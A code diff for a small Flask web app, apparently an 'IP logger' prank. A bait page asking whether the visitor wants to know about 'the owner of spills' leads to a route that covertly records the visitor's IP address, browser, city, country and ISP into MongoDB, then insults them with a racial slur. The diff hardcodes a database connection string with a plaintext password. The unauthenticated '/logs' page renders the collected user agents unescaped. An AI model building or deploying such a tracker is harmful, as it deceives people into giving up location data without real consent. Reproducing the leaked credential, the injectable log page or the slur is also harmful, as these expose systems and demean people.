@@ -1,21 +1,18 @@
 from flask import Flask, request, render_template_string
 import requests
-import csv
 from datetime import datetime
 import pytz
-import os
+from pymongo import MongoClient
 
 app = Flask(__name__)
 
-LOG_FILE = "logs.csv"
-
-# Ensure CSV file exists
-if not os.path.exists(LOG_FILE):
-    with open(LOG_FILE, mode='w', newline='') as file:
-        writer = csv.writer(file)
-        writer.writerow(["IP", "User-Agent", "City", "Country", "ISP", "Timestamp"])
+# 🔹 MongoDB Connection
+client = MongoClient("mongodb+srv://prathamdesai786_db_user:Shelby@1980@cluster0.h5mgcpd.mongodb.net/?appName=Cluster0")
+db = client["iplogger"]
+collection = db["logs"]
 
 
+# 🔹 Get Real IP (handles proxies like Render)
 def get_ip():
     if request.headers.get('X-Forwarded-For'):
         return request.headers.get('X-Forwarded-For').split(',')[0].strip()
@@ -24,19 +21,22 @@ def get_ip():
     return request.remote_addr
 
 
+# 🔹 Get IST Time
 def get_time():
     ist = pytz.timezone('Asia/Kolkata')
     return datetime.now(ist).strftime("%Y-%m-%d %H:%M:%S")
 
 
+# 🔹 Consent Page
 @app.route('/spills')
 def consent_page():
     return render_template_string("""
-        <h2>Want to know about the owner of spills ?</h2>
+        <h2>Do you want to know about the owner of spills ?</h2>
         <a href="/fool"><button>Yes</button></a>
     """)
 
 
+# 🔹 Data Collection
 @app.route('/fool')
 def collect_data():
     ip = get_ip()
@@ -57,30 +57,53 @@ def collect_data():
         print("API ERROR:", e)
         city, country, isp = "N/A", "N/A", "N/A"
 
-    # Save to CSV
-    with open(LOG_FILE, mode='a', newline='') as file:
-        writer = csv.writer(file)
-        writer.writerow([ip, user_agent, city, country, isp, timestamp])
+    # 🔹 Store in MongoDB
+    collection.insert_one({
+        "ip": ip,
+        "user_agent": user_agent,
+        "city": city,
+        "country": country,
+        "isp": isp,
+        "timestamp": timestamp
+    })
 
     return """
-        <h2>You were fooled nigga !!</h2>
+        <h2>You were fooled my NIGGA !!</h2>
     """
 
 
+# 🔹 View Logs
 @app.route('/logs')
 def view_logs():
-    try:
-        with open("logs.csv", "r") as file:
-            rows = file.readlines()
+    data = collection.find()
 
-        table = "<table border='1'>"
-        for row in rows:
-            table += "<tr>" + "".join(f"<td>{col.strip()}</td>" for col in row.split(",")) + "</tr>"
-        table += "</table>"
+    table = """
+    <h2>Collected Logs</h2>
+    <table border='1'>
+    <tr>
+        <th>IP</th>
+        <th>User-Agent</th>
+        <th>City</th>
+        <th>Country</th>
+        <th>ISP</th>
+        <th>Timestamp</th>
+    </tr>
+    """
 
-        return table
-    except:
-        return "No logs available yet."
+    for row in data:
+        table += f"""
+        <tr>
+            <td>{row.get('ip')}</td>
+            <td>{row.get('user_agent')}</td>
+            <td>{row.get('city')}</td>
+            <td>{row.get('country')}</td>
+            <td>{row.get('isp')}</td>
+            <td>{row.get('timestamp')}</td>
+        </tr>
+        """
+
+    table += "</table>"
+    return table
 
 
 if __name__ == '__main__':
